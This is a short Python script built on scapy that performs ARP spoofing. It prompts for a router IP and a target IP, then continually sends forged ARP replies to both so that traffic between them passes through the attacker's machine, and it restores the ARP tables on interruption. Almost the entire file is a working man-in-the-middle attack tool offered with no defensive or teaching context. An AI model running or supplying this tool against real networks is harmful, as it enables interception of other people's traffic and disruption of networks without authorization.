#!/usr/bin/python3

import scapy.all as scapy


def get_target_mac(IP):
	arp_request = scapy.ARP(pdst=IP)
	broadcast = scapy.Ether(dst="ff:ff:ff:ff:ff:ff")
	finalPacket = broadcast/arp_request
	answer = scapy.srp(finalPacket, timeout=2,verbose=False)[0]
	# print(answer)
	mac = answer[0][1].hwsrc
	return mac


def spoof_arp(targetIP, spoofedIP):
	macAddr =  get_target_mac(targetIP)
	packet = scapy.ARP(op=2, hwdst= macAddr, pdst=targetIP, psrc=spoofedIP)
	scapy.send(packet,verbose=False)


def restore(destination_IP, source_IP):
	dest_mac = get_target_mac(destination_IP)
	src_mac = get_target_mac(source_IP)
	packet = scapy.ARP(op=2, pdst=destination_IP,hwdst=dest_mac, psrc=source_IP, hwsrc=src_mac)
	scapy.send(packet, verbose=False)

def main():
	routerIP = input("Router IP: ")
	targetIP = input("Target IP: ")
	try:
		while True:
			spoof_arp(routerIP, targetIP)
			spoof_arp(targetIP, routerIP)
	
	except KeyboardInterrupt:
		restore(routerIP, targetIP)
		restore(targetIP, routerIP)
		exit(0)
	
'''def main():
	IP = "192.168.31.1"
	mac = get_target_mac(IP)
	print(mac)
'''
if __name__ == '__main__':
	main()